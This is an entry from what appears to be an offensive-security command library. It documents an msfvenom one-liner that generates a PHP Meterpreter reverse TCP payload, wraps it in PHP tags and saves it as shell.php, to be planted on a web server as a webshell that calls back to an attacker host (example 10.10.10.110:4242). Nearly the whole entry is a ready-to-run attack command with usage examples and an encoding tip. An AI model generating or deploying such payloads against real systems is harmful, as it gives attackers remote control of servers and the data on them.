---
id: 77fd5612-f53f-4de0-bfad-50d2f6c98240
name: msfvenom-generate-php-meterpreter-reverse-tcp-raw
type: command
executor: bash
data: >-
  msfvenom -p php/meterpreter_reverse_tcp LHOST="$_LHOST" LPORT="$_LPORT" -f raw
  > temp.php; cat temp.php | pbcopy && echo '<?php ' | tr -d '\n' >
  $_OUTPUT_FILE && pbpaste >> $_OUTPUT_FILE && rm temp.php
output: null
created_at: '2023-04-06T03:56:21.275365+00:00'
updated_at: '2023-04-10T20:25:02.586400+00:00'
platforms:
  - PHP
tags:
  - meterpreter
  - webshell
  - payload-generation
verified: true
validated: true
---

# msfvenom-generate-php-meterpreter-reverse-tcp-raw

## Command

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST="$_LHOST" LPORT="$_LPORT" -f raw > temp.php; cat temp.php | pbcopy && echo '<?php ' | tr -d '\n' > $_OUTPUT_FILE && pbpaste >> $_OUTPUT_FILE && rm temp.php
```

## Description

Generates a PHP Meterpreter reverse TCP payload in raw format, wrapped with PHP tags for execution on web servers as a webshell.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -p php/meterpreter_reverse_tcp | PHP Meterpreter reverse payload | Yes |
| LHOST="$_LHOST" | Attacker IP | Yes |
| LPORT="$_LPORT" | Port | Yes |
| -f raw | Raw output format | Yes |
| > $_OUTPUT_FILE | Final PHP file (e.g., shell.php) | Yes |

## Examples

### Basic Usage

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f raw > temp.php; cat temp.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php && rm temp.php
```

### Advanced Usage

Add encoding: -e php/base64.

## Expected Output

Creates 'shell.php' starting with <?php. Verify:

```bash
head -1 shell.php
<?php
```

Content is obfuscated PHP code. Access via web to trigger.

## Related

- [[procedures/Meterpreter-Payload-Generation]]
- [[tools/Metasploit-Framework]]
